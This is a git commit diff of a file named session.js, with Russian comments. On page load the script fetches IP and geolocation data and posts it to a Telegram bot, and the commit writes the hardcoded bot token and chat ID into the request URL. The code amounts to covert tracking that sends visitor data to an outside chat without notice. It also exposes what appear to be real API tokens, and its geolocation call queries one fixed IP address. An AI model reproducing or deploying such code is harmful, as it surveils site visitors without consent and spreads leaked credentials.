2a78e5fb473ea4c02df8ced727fc416adfff4cfc
iDONi <30952073+Aidoni0797@users.noreply.github.com>
2025-01-22 21:53:45 +0500

    Update session.js

--- session.js
+++ session.js
@@ -1,11 +1,10 @@
 window.onload = function() {
-    const BOT_TOKEN = '8178967594:AAFos-m53_Q6f0mBoEdvVhq0FH5V4jUOkdM';
     // Получаем данные пользователя (например, IP и геолокацию)
     fetch('https://ipinfo.io/2.134.77.153?token=c0c78c76ac0ca3')  // Замените на ваш токен для получения IP
         .then(response => response.json())
         .then(data => {
             // Отправляем эти данные в бот или на сервер
-            fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendMessage', {  // Адрес для отправки данных в бота
+            fetch('https://api.telegram.org/bot8178967594:AAFos-m53_Q6f0mBoEdvVhq0FH5V4jUOkdM/sendMessage?chat_id=1163463444&text=<Message>', {  // Адрес для отправки данных в бота
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
